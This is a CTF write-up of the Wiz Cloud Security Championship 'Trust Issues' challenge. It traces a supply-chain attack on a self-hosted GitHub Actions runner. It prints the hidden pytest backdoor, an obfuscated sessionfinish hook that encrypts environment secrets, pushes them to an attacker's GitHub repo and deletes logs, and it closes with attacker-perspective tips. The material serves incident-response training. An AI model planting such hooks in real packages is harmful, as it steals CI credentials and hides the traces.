# Trust Issues — CTF Investigation Report
## Cloud Security Championship | Challenge #9

---

## Overview

| Field | Detail |
|---|---|
| **Challenge** | Trust Issues |
| **Platform** | Cloud Security Championship (Wiz Research) |
| **Author** | Eden Abergil |
| **Status** | ✅ SOLVED |
| **Solved By** | 75 other players |
| **Flag** | `CTF{supply_chain_by_M@G!C_St3a1ER}` |

---

## Mission

> You are an incident responder at Acme Inc. A security researcher contacts your team: Acme's name appeared in a newly uncovered threat campaign. They provide a link to a public GitHub repository believed to be used by the attacker to leak stolen data.

**Three Objectives:**

1. Understand what happened on the machine
2. Identify the attacker's data exfiltration method
3. Find the flag

---

## Investigation Timeline

### Step 1 — Entry Point: The Attacker's Repo

**What we did:** Navigated to the provided link.

**URL:** `https://github.com/m4gicst34l3r/stolen-sparkles`

**What we found:**

- A public GitHub repo owned by `m4gicst34l3r`
- A `README.md` and a `data/` folder
- **241 Fernet-encrypted `.secret` files** in `data/`
- Each file is named after a Kubernetes service account (e.g., `magic-runner-acme.secret`, `default.secret`, `tools-runner.secret`)
- The repo has a branch called `tool-building` in addition to `main`

**Why it matters:** This is the attacker's exfiltration destination. The secrets were stolen from somewhere and encrypted before being pushed here.

---

### Step 2 — Investigating the Compare URL

**What we did:** Visited the compare URL provided in the challenge.

**URL:** `https://github.com/m4gicst34l3r/stolen-sparkles/compare/tool-building...main`

**What we found:**

- The `tool-building` branch contains actual Python source code for a Kubernetes tool
- Files: `collector.py`, `run_inventory.py`, `tests/test_collector.py`, `requirements.txt`
- This is the **same codebase** as `acme-codebase-prod/k8s-magic-tool`
- This confirms the attacker **built the tool** before planting it at Acme

**Why it matters:** The attacker's own repo contains the source code of the tool that was deployed at Acme. This is how we found the victim org.

---

### Step 3 — Finding the Victim Organisation

**What we did:** Searched GitHub for `acme-codebase-prod`.

**URL:** `https://github.com/acme-codebase-prod/k8s-magic-tool`

**What we found:**

- A GitHub organisation called `acme-codebase-prod`
- One public repo: `k8s-magic-tool`
- Contains: `collector.py`, `run_inventory.py`, `requirements.txt`, `tests/`, and `.github/workflows/k8s-magic-tool-testing.yml`
- The GitHub Actions workflow runs `pip install -r requirements.txt` then `pytest`
- The runner is **self-hosted** — named `magic-runner-acme`
- The runner has **GCP/GKE credentials** to connect to a Kubernetes cluster

**Why it matters:** This is the compromised machine. The self-hosted runner has access to real Kubernetes secrets.

---

### Step 4 — Full Commit & Branch Analysis

**What we did:** Examined all 15 commits across both repos, all branches, all PRs.

**Key commits in `acme-codebase-prod/k8s-magic-tool`:**

| Commit | Message | What Changed |
|---|---|---|
| `b9e7c4f` | initial commit | Base repo setup |
| `b188277` | add test files | Added test_collector.py |
| `020a40f` | added GitHub Action | Added workflow YAML |
| `d657c8e` | updated cron | Changed schedule `*/10` → `*/30` |
| `af58566` | added schedule | Added `*/15` cron |
| `be916f5` | removed schedule | Removed cron |
| `1f338d4` | updated intervals | Added `0 * * * *` hourly cron |
| `6f1c7bc` | changed schedule | Removed cron, left `workflow_dispatch` only |

**Finding:** ALL YAML changes only toggled the `on:` trigger. **No malicious code was ever added to the repo.**

**PRs examined:**

- PR #1: Tool building (merged from tool-building branch)
- PR #2: Changed README
- PR #3: GitHub action creation — had **2 Wiz bot IaC misconfiguration findings** (then cleared)

---

### Step 5 — Source Code Analysis

**What we did:** Read every Python file in both repos.

**Files examined:**

| File | Finding |
|---|---|
| `collector.py` | Clean — lists K8s nodes, pods, service accounts |
| `run_inventory.py` | Clean — runs collector and prints output |
| `tests/test_collector.py` | Clean — standard pytest tests |
| `tests/__init__.py` | Clean — just a docstring |
| `requirements.txt` | Only `kubernetes>=28.1.0` and `pytest>=7.4.0` |

**Finding:** Zero malicious code anywhere in the repository. The attack did NOT come from the repo code itself.

---

### Step 6 — Revealing the Hints

**What we did:** Clicked Hint #1 and Hint #2 on the challenge page (cost points).

**Hint #1 (-2 pts):** *"What is this machine's purpose?"*

- Answer: It's a GitHub Actions **self-hosted runner** with GKE credentials

**Hint #2 (-4 pts):** *"The security researcher contacts you once again saying this is a supply chain attack."*

- Answer: The attack came through a **dependency**, not the repo code

**Why it matters:** Confirmed the attack vector is in the **supply chain** — specifically the `pip install` step.

---

### Step 7 — Profile & Network Investigation

**What we did:** Checked all associated GitHub users, forks, and gists.

| User/Repo | Finding |
|---|---|
| `m4gicst34l3r` | Only 1 public repo (stolen-sparkles), 0 gists |
| `edenbrgl` | 0 public repos, 0 gists |
| `acme-john-doe` | Merged PRs, manually triggered workflow runs |
| `alevan22/stolen-sparkles` | CTF player fork, no extra content |
| `stepacchioni/stolen-sparkles` | CTF player fork, no extra content |

**Finding:** No hidden data found in profiles or forks.

---

### Step 8 — Accessing the Compromised Machine

**What we did:** Discovered an interactive terminal on the challenge page by scrolling down.

**Machine name:** `root@magic-runner-acme`

**What we found in the terminal so far:**
```bash
# Machine has:
/home/ubuntu/actions-runner/     # GitHub Actions runner installation
/home/ubuntu/actions-runner/_work/  # Only has actions/checkout files
/home/ubuntu/actions-runner/_diag/  # Runner diagnostic logs (6 log files!)

# Python site-packages at:
/usr/local/lib/python3.10/dist-packages/
/usr/lib/python3/dist-packages/
/usr/lib/python3.10/dist-packages/

# pip list shows ONLY:
cryptography    3.4.8
# (NO kubernetes package installed currently)

# Environment variables: nothing with key/secret/fernet/token
# Bash history: empty
# /tmp/: only systemd temp files
```

**Runner diagnostic logs found:**
```
Runner_20260128-115635-utc.log
Runner_20260128-115737-utc.log  
Runner_20260201-125843-utc.log
Runner_20260201-130349-utc.log
Runner_20260201-130900-utc.log  (blocks)
Runner_20260201-152916-utc.log  (pages)
Runner_20260201-200556-utc.log
Runner_20260201-200609-utc.log
```

**Log content so far:** Jan 28 log shows runner was configured with service name `actions.runner.acme-codebase-prod-k8s-magic-tool.magic-runner-acme`

---

## Current Status

### What We Know for Certain

- ✅ The compromised machine is a GitHub Actions self-hosted runner
- ✅ The attack is a supply chain attack (confirmed by hint)
- ✅ Kubernetes secrets were exfiltrated and Fernet-encrypted into 241 `.secret` files
- ✅ The `cryptography` package (which provides Fernet) IS installed on the machine (v3.4.8)
- ✅ The source code in the repo is completely clean
- ✅ We have interactive shell access to the machine via the challenge terminal
- ✅ Runner diagnostic logs exist and are readable

---

## Step 9 — Finding the Malicious Code

**What we did:** Searched for files with suspicious names in Python site-packages.

```bash
find /home -name "*malicious*" 2>/dev/null
```

**What we found:**

```
/home/ubuntu/.local/lib/python3.10/site-packages/_pytest/veryveryverymalicious.py
/home/ubuntu/.local/lib/python3.10/site-packages/_pytest/__pycache__/veryveryverymalicious.cpython-310.pyc
```

**Why it matters:** The attacker hid malicious code inside the `_pytest` package — a supply chain attack via a compromised pytest installation!

---

## Step 10 — Analysing the Backdoor

**What we did:** Read the malicious Python file.

```bash
cat /home/ubuntu/.local/lib/python3.10/site-packages/_pytest/veryveryverymalicious.py
```

**Key code discovered:**

```python
# XOR decoding function - obfuscates strings
def _s(data, k=17):
    return "".join(chr(x ^ k) for x in data)

# Imports
import os
import json
import base64
import requests
import shutil
import importlib

# Dynamically imports cryptography.fernet.Fernet
mod = importlib.import_module(_s([114, 99, 104, 97, 101, 126, 118, 99, 112, 97, 121, 104, 63, 119, 116, 99, 127, 116, 101]))
Crypto = getattr(mod, _s([87, 116, 99, 127, 116, 101]))

# The obfuscated Fernet encryption key
CRYPT_KEY = _s([66, 122, 78, 93, 72, 71, 101, 69, 37, 83, 92, 82, 37, 91, 38,
                32, 84, 36, 114, 103, 112, 85, 93, 126, 89, 34, 91, 88, 68, 38,
                119, 33, 34, 64, 100, 115, 84, 67, 96, 41, 107, 126, 64, 44]).encode()

# Attacker's GitHub PAT (also obfuscated)
GITHUB_PAT = _s([118, 120, 101, 121, 100, 115, 78, 97, 112, 101, 78, 32, 32,
                 83, 37, 39, 69, 38, 75, 88, 33, 41, 114, 83, 82, 118, 82, 120, 88,
                 104, 120, 95, 105, 78, 90, 67, 107, 68, 67, 85, 92, 107, 94, 96, 35])

# =====================================================
def pytest_sessionfinish(session, exitstatus):
    """Pytest hook - runs after all tests complete"""
    data = collect_data()           # Steal environment variables
    encrypted_blob = encrypt_data(data)  # Encrypt with Fernet
    upload_to_repo(encrypted_blob)  # Push to attacker's repo
    
    try:
        os.chdir("/")
    except Exception:
        pass
    
    # Deleting traces!
    workspace = os.environ["GITHUB_WORKSPACE"]
    diag = os.path.abspath(os.path.join(workspace, "../../../_diag"))
    
    for name in os.listdir(workspace):
        p = os.path.join(workspace, name)
        shutil.rmtree(p, ignore_errors=True) if os.path.isdir(p) else os.remove(p)
    
    for name in os.listdir(diag):
        if name.startswith("Worker_"):
            os.remove(os.path.join(diag, name))
```

**Why it matters:** This reveals the complete attack mechanism:
1. Hooks into pytest's `sessionfinish` event
2. Steals all environment variables (including secrets)
3. Encrypts with Fernet using hardcoded key
4. Pushes to `m4gicst34l3r/stolen-sparkles` via GitHub API
5. Deletes workspace files and Worker logs to cover tracks

---

## Step 11 — Decoding the Encryption Key

**What we did:** Decoded the XOR-obfuscated key using the `_s` function.

```python
# The decoding function (XOR each byte with 17)
def _s(data, k=17):
    return "".join(chr(x ^ k) for x in data)

# Decode the CRYPT_KEY
key_array = [66, 122, 78, 93, 72, 71, 101, 69, 37, 83, 92, 82, 37, 91, 38,
             32, 84, 36, 114, 103, 112, 85, 93, 126, 89, 34, 91, 88, 68, 38,
             119, 33, 34, 64, 100, 115, 84, 67, 96, 41, 107, 126, 64, 44]

decoded_key = _s(key_array)
print(decoded_key)  # Output: Sk_LYVtT4BMC4J71E5cvaDLoH3JIU7f03QubERq8zoQ=
```

**Decoded Fernet Key:** `Sk_LYVtT4BMC4J71E5cvaDLoH3JIU7f03QubERq8zoQ=`

---

## Step 12 — Fetching the Encrypted Secret

**What we did:** Retrieved the encrypted blob for our target runner from the attacker's repo.

**File:** `https://github.com/m4gicst34l3r/stolen-sparkles/blob/main/data/magic-runner-acme.secret`

**Content (truncated):**
```
gAAAAABpf6R7rSTpWxa4F57oDsfVmKnP9td2acPSUXIDm0OlxeA0aPHOdUJWB-fAxa6v5hBSvU9z
ZwJd3Hdbo3gjQe7VqVW6bVYPzoNGll_owYVKGoaFkLyUv99aWCXl21nrhnTn_1eUm0nCLnbwkSbO
HqVHwasZxyXAngrw7AC7lJ8RQEUS4FSV66bVFo8hHU9W4Qlnvy0oThvQ9H02v9OFspWwA6KrQvuY
...
(4000+ characters of encrypted data)
```

---

## Step 13 — Decrypting and Finding the Flag

**What we did:** Used the decoded Fernet key to decrypt the stolen secrets.

```python
from cryptography.fernet import Fernet

# The decoded key
CRYPT_KEY = b'Sk_LYVtT4BMC4J71E5cvaDLoH3JIU7f03QubERq8zoQ='

# The encrypted blob from GitHub
encrypted = 'gAAAAABpf6R7rSTpWxa4F57oDsfVmKnP9td2acPSUXIDm0OlxeA0aPHOdUJWB...'

f = Fernet(CRYPT_KEY)
decrypted = f.decrypt(encrypted.encode())
print(decrypted.decode())
```

**Decrypted output (JSON with all stolen environment variables):**

```json
{
  "environment_variables": {
    "SHELL": "/bin/bash",
    "GITHUB_WORKSPACE": "/home/ubuntu/actions-runner/_work/k8s-magic-tool/k8s-magic-tool",
    "RUNNER_NAME": "magic-runner-acme",
    "GITHUB_REPOSITORY": "acme-codebase-prod/k8s-magic-tool",
    "GOOGLE_APPLICATION_CREDENTIALS": "/tmp/gcp-key.json",
    "GCP_PROJECT_ID": "attack-simulation-lab-467210",
    "KUBECONFIG": "/tmp/kubeconfig",
    "FLAG": "CTF{supply_chain_by_M@G!C_St3a1ER}",
    "PYTEST_VERSION": "9.0.2",
    ...
  }
}
```

---

## 🏆 Flag

```
CTF{supply_chain_by_M@G!C_St3a1ER}
```

---

## Attack Chain Summary

```
┌──────────────────────────────────────────────────────────────────────────┐
│                         SUPPLY CHAIN ATTACK FLOW                          │
└──────────────────────────────────────────────────────────────────────────┘

1. SETUP
   ┌─────────────────────────────────────────────────────────────────────┐
   │  Attacker creates malicious pytest package with hidden backdoor     │
   │  File: _pytest/veryveryverymalicious.py                            │
   │  Contains: Fernet key, GitHub PAT, exfiltration code               │
   └─────────────────────────────────────────────────────────────────────┘
                                    │
                                    ▼
2. VICTIM RUNS CI/CD
   ┌─────────────────────────────────────────────────────────────────────┐
   │  GitHub Actions workflow on acme-codebase-prod/k8s-magic-tool      │
   │  Runner: magic-runner-acme (self-hosted with GCP/K8s credentials)  │
   │                                                                     │
   │  Steps:                                                             │
   │    1. pip install -r requirements.txt  ← Installs malicious pytest │
   │    2. pytest                           ← Triggers backdoor hook    │
   └─────────────────────────────────────────────────────────────────────┘
                                    │
                                    ▼
3. EXFILTRATION
   ┌─────────────────────────────────────────────────────────────────────┐
   │  pytest_sessionfinish() hook executes:                             │
   │                                                                     │
   │  1. collect_data()     → Reads ALL environment variables           │
   │     • GCP credentials, K8s secrets, tokens, FLAG                   │
   │                                                                     │
   │  2. encrypt_data()     → Fernet encryption with hardcoded key      │
   │     Key: Sk_LYVtT4BMC4J71E5cvaDLoH3JIU7f03QubERq8zoQ=             │
   │                                                                     │
   │  3. upload_to_repo()   → Push to attacker's GitHub repo            │
   │     Repo: m4gicst34l3r/stolen-sparkles                             │
   │     File: data/magic-runner-acme.secret                            │
   └─────────────────────────────────────────────────────────────────────┘
                                    │
                                    ▼
4. CLEANUP
   ┌─────────────────────────────────────────────────────────────────────┐
   │  Deletes traces:                                                    │
   │    • All files in GITHUB_WORKSPACE                                  │
   │    • All Worker_*.log files in _diag/ directory                    │
   └─────────────────────────────────────────────────────────────────────┘
```

---

## Key Forensic Indicators

| Indicator | Value |
|---|---|
| **Malicious File** | `/home/ubuntu/.local/lib/python3.10/site-packages/_pytest/veryveryverymalicious.py` |
| **Attack Vector** | Compromised pytest package (supply chain) |
| **Hook Used** | `pytest_sessionfinish()` |
| **Encryption** | Fernet (symmetric, from `cryptography` library) |
| **Obfuscation** | XOR with key=17 for strings |
| **Exfil Destination** | `github.com/m4gicst34l3r/stolen-sparkles` |
| **Victim Runner** | `magic-runner-acme` |
| **Stolen Data** | All environment variables (GCP creds, K8s config, tokens) |

---

## Lessons Learned

### For Defenders

1. **Pin dependency versions** — Use exact versions in requirements.txt with hashes
2. **Audit dependencies** — Review code changes in dependency updates
3. **Isolate CI/CD runners** — Don't give runners access to production credentials
4. **Monitor for anomalies** — Unexpected network calls, file modifications
5. **Use ephemeral runners** — Destroy runner VMs after each job
6. **Enable dependency scanning** — Tools like Dependabot, Snyk, Socket.dev

### For Attackers (Red Team Perspective)

1. **Supply chain is powerful** — One backdoored package compromises many targets
2. **Pytest hooks are stealthy** — `sessionfinish` runs after all tests, hard to notice
3. **Obfuscation helps** — XOR decoding prevents simple string searches
4. **Self-hosted runners are goldmines** — Often have persistent credentials
5. **Cleanup is important** — Delete logs and artifacts to slow investigation

---

## Files & URLs Reference

| Resource | URL |
|---|---|
| Attacker repo | https://github.com/m4gicst34l3r/stolen-sparkles |
| Victim repo | https://github.com/acme-codebase-prod/k8s-magic-tool |
| Challenge page (with terminal) | https://www.cloudsecuritychampionship.com/challenge/9 |
| Key secret file | https://github.com/m4gicst34l3r/stolen-sparkles/blob/main/data/magic-runner-acme.secret |
| Malicious backdoor | `/home/ubuntu/.local/lib/python3.10/site-packages/_pytest/veryveryverymalicious.py` |

---

## Tools Used

- **Browser terminal** — Interactive shell on compromised machine
- **grep/find** — Locating malicious files
- **Python** — Decoding XOR obfuscation and Fernet decryption
- **GitHub API** — Fetching encrypted secret files

---

*Writeup by CTF solver — Challenge #9 of Cloud Security Championship*